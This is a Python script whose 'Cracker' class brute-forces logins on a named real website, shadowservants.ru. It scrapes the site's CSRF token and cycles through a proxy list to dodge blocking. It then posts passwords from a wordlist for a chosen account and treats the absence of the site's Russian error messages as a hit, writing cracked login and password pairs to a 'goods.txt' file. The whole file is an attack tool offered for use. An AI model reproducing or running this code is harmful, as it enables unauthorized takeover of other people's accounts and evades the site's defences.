from requests import session
from requests import exceptions
import time
import re
import os

last_password = ''
counter = 0
class Cracker:
    gproxy = ''
    def session_get(self,proxy,login,passwords,startpoint,endpoint):
        global gproxy
        r = session()
        prox = proxy.pop()
        if len(proxy) == 0:
            print('\n\nI have spent all proxies. Please update them.')
            exit()
        gproxy = proxy
        try:
            r.proxies = {'https': 'https://'+prox}
            data = r.get('https://shadowservants.ru/login',timeout=5).text
            reg = re.findall(r'<meta name=\"csrf_token\" content=\"[A-Za-z0-9.-]+\" />',data)
            if len(str(reg)) < 3:
                time.sleep(1)
                print('Hmmm. Looks like bad proxy: ' + prox + ' I\'ll repair it.')
                self.session_get(proxy,login,passwords,startpoint,endpoint)
                return
            csrf = str(reg).split()[2]
            csrf = csrf.split('"')
            csrf = csrf[1].replace('"','')
            self.auth(r,csrf,prox,login,passwords,startpoint,endpoint)
        except:
            time.sleep(1)
            print('Hmmm. Looks like bad proxy: ' + prox + ' I\'ll repair it.')
            self.session_get(proxy,login,passwords,startpoint,endpoint)
    def auth(self,r,csrf,prox,login,passwords,startpoint,endpoint):
        global last_password
        global gproxy
        global counter
        f = open(passwords,'r',encoding='utf-8')
        password = f.readline()
        if counter < startpoint:
            while counter != startpoint:
                password = f.readline()
                counter+=1
        password = password.strip()
        password = password.replace('\\n', '')
        if last_password != '':
            while password != last_password:
                password = f.readline()
        while password:
            password = password.strip()
            password = password.replace('\\n','')
            try:
                repl = r.post(url='https://shadowservants.ru/login',data={'login':login,'password':password, 'csrf_token':csrf},headers={"referer": "https://shadowservants.ru/login"}, timeout=5)
                if "Неправильный логин или пароль" not in repl.text and "Пользователь неактивен" not in repl.text:
                    try:
                        os.mkdir('./workout/')
                    except:
                        pass
                    try:
                        f = open('./workout/goods.txt','a', encoding='utf-8')
                        f.write('Good: '+login + "|"+password+'\n')
                        f.close()
                    except:
                        print('\nCan\'t save results. Ok, I just say it here.\n')
                    print("\n\nNicely done! Password for \""+login+"\" is \""+password+"\"")
                    raise KeyboardInterrupt
                else:
                    print('\nBad attempt with the "'+password+'" password.')
                password = f.readline()
                counter+=1
                if counter == endpoint:
                    raise KeyboardInterrupt
            except KeyboardInterrupt:
                print('Ok. My work done.')
                f.close()
                exit()
            except:
                time.sleep(1)
                print('Hmmm. Looks like bad proxy: ' + prox + ' I\'ll repair it.')
                f.close()
                self.session_get(gproxy,login,passwords,startpoint,endpoint)
                return

        f.close()